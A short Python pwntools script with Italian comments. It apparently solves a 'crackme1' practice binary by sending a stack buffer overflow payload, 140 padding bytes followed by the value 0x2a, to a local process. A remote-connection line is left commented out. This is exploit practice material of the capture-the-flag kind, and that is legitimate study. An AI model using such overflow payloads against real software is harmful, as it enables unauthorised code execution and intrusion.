from pwn import *

# p = remote('host', port)  # Connessione a un processo remoto

p = process('./crackme1')  # Avvio di un processo locale

payload = b'A' * (128 + 4*3) + p32(0x0000002a)

p.sendline(payload)

response = p.recvuntil('This is the answer!')

# gdb.attach(p)  # Attacca il processo utilizzando GDB
